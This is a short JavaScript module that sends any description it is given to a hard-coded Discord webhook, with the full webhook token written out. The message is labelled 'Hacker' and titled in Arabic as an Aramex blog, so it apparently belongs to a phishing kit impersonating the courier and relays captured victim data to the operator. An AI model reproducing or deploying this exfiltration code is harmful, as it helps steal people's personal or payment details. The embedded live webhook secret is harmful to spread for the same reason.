import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة ارامكس ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1330869642557657201/Xn_PxaSByyHwrtPwhLVa79AvH0jbrTe4JRzhhWyNpoPZWXMDqNtaokLW2_A2e-ddZs1L",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
